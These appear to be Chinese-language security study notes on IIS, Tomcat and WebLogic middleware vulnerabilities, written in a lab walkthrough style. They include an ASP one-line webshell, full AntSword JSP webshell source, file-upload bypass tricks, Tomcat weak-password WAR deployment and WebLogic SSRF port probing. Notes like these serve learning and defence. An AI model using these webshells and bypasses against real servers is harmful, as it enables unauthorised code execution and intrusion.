# 网络安全基础

## 网闸

#### 1. 概念

- 网闸是使用带有多种控制功能的**固态开关读写介质**
- 连接两个独立主机系统的**信息安全设备**
- 使系统间不存在通信的物理连接、逻辑连接及信息传输协议，**不存在依据协议进行的信息交换**，而**只有以数据文件形式进行的无协议摆渡**
- 网闸从物理上隔离、**阻断了对内网具有潜在攻击可能的一切网络连接**，使外部攻击者无法直接入侵、攻击或破坏内网，保障了内部主机的安全。

### 请求方法

- PUT通常也用来上传文件
- 通过OPTIONS，可以知道对应服务器支持什么请求
  - ![image-20220521094354423](C:\Users\YL\AppData\Roaming\Typora\typora-user-images\image-20220521094354423.png)



## 中间件漏洞

### IIS漏洞

#### 1. IIS PUT请求漏洞

- IIS6.0版本
- 开启WebDAV 和写权限

如果直接写如一句话木马shell.asp文件，则会出现404错误，上传失败

![image-20220521095249549](C:\Users\YL\AppData\Roaming\Typora\typora-user-images\image-20220521095249549.png)

先利用PUT上传shell.txt，内容为asp一句话<%eval request("1")%>

![image-20220521095009302](C:\Users\YL\AppData\Roaming\Typora\typora-user-images\image-20220521095009302.png)



201 状态码，代表文件创建成功，成功上传了一个le.txt的文件

然后利用MOVE 或 COPY请求方式将shell.txt改为shell.asp;.jpg，（这里直接修改shell.asp同样会出现403）

![image-20220521095718284](C:\Users\YL\AppData\Roaming\Typora\typora-user-images\image-20220521095718284.png)

这样就成功的将shell.asp;.jpg上传成功了，这里使用shell.asp;.gif也可以，成功之后可以使用蚁剑进行连接

![image-20220521101330203](C:\Users\YL\AppData\Roaming\Typora\typora-user-images\image-20220521101330203.png)

![image-20220521101355318](C:\Users\YL\AppData\Roaming\Typora\typora-user-images\image-20220521101355318.png)

![image-20220521101407853](C:\Users\YL\AppData\Roaming\Typora\typora-user-images\image-20220521101407853.png)

这样就是连接成功了

所以我们是先上传了一个txt文件，这样先绕过了直接上传asp文件，然后通过MOVE或COPY，修改了上传的txt文件的后缀，改为shell.asp;.jpg，让他误以为是jpg文件，同时shell.asp;.jpg又能够被当作asp文件执行（分号；后面的不被解析），这样就完成了我们的一句话木马。

这里使用/shell.asp/shell.txt也可以实现绕过

![image-20220521102532974](C:\Users\YL\AppData\Roaming\Typora\typora-user-images\image-20220521102532974.png)

#### 2. IIS 短文件名漏洞

- 在网站根目录下添加aaaaaaaaaa.html，进行猜解，文件存在，返回404
- 存在则返回404，不存在则返回400

#### 3. IIS 远程代码执行

在IIS6.0处理PROPFIND指令的时候，由于对url的长度没有进行有效的长度控制和检查，导致执行memcpy对虚拟路径进行构造的时候，引发栈溢出，从而导致远程代码执行

### Tomcat 漏洞 

#### 1. Tomcat PUT上传文件漏洞

- Tomcat 7.0.0 – 7.0.81

- 需tomcat设置readonly为false
- Tomcat 运行在Windows 主机上，且readonly为false（开启put），可通过构造的攻击请求向服务器上传包含任意代码的 JSP 文件，造成任意代码执行。

![image-20220521172003655](C:\Users\YL\AppData\Roaming\Typora\typora-user-images\image-20220521172003655.png)

没有办法直接上传shell.jsp，所以后面加上一个/，即shell.jsp/，从而绕过。

补充：burpsuite使用PUT请求的方法，先代理，然后发到repeater后，一开始是GET请求，change method，变为POST，然后把POST修改为PUT就可以了。

中国蚁剑的jsp脚本代码如下：

```jsp
<%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
 
    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
%>
<%
    String cls = request.getParameter("passwd");
    if (cls != null) {
        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
    }
%>
```

#### 2. Tomcat7+弱密码&&后端Getshell漏洞

![image-20220521173637830](C:\Users\YL\AppData\Roaming\Typora\typora-user-images\image-20220521173637830.png)

![image-20220521173646805](C:\Users\YL\AppData\Roaming\Typora\typora-user-images\image-20220521173646805.png)

![image-20220521173739352](C:\Users\YL\AppData\Roaming\Typora\typora-user-images\image-20220521173739352.png)

上面这个就是抓取到的包，欺诈Basic后面就是输入的账号密码，并一定对，目前这个是Base64编码，可以解码查看。

![image-20220521173838041](C:\Users\YL\AppData\Roaming\Typora\typora-user-images\image-20220521173838041.png)

![image-20220521175347616](C:\Users\YL\AppData\Roaming\Typora\typora-user-images\image-20220521175347616.png)

![image-20220521175229099](C:\Users\YL\AppData\Roaming\Typora\typora-user-images\image-20220521175229099.png)

由于tomcat后台的弱口令，因此非常容易就能够通过爆破的方式，取得账号密码，之后进入tomcat的后台，就能够直接部署war文件（war文件其实就是一个压缩文件，我们可以把我们的jsp木马文件，通过zip打包，然后改后缀名为war，得到shell.war的文件，然后上传就可以实现我们的webshell了）

![image-20220521180319110](C:\Users\YL\AppData\Roaming\Typora\typora-user-images\image-20220521180319110.png)

上传，然后deploy之后，就完成了shell的上传，路径为/shell/shell.jsp

然后通过蚁剑连接即可

![image-20220521180503287](C:\Users\YL\AppData\Roaming\Typora\typora-user-images\image-20220521180503287.png)

### WebLogic漏洞

#### 1. WebLogic ssrf漏洞

- Weblogic中存在一个SSRF漏洞，利用该漏洞**可以发送任意HTTP请求**

抓包

![image-20220521205201632](C:\Users\YL\AppData\Roaming\Typora\typora-user-images\image-20220521205201632.png)

![image-20220521205138124](C:\Users\YL\AppData\Roaming\Typora\typora-user-images\image-20220521205138124.png)

拿到的这个包，可以看到这个参数operator，这里的这个链接就会造成ssrf攻击，使我们能够获取到内网的信息

![image-20220521205807002](https://cdn.jsdelivr.net/gh/ceresopa/img/imgimage-20220521205807002.png)

![image-20220521205823387](https://cdn.jsdelivr.net/gh/ceresopa/img/imgimage-20220521205823387.png)

可以通过不同的返回，来查看端口是否开放，可以看到内网的7001端口开放，7000端口未开放。

#### 2. WebLogic管理控制台未授权RCE 

- RCE，远程连接命令/代码执行漏洞，简称RCE漏洞，能够让攻击者直接向后台服务器远程写入服务器系统命令或者代码，从而控制后台系统。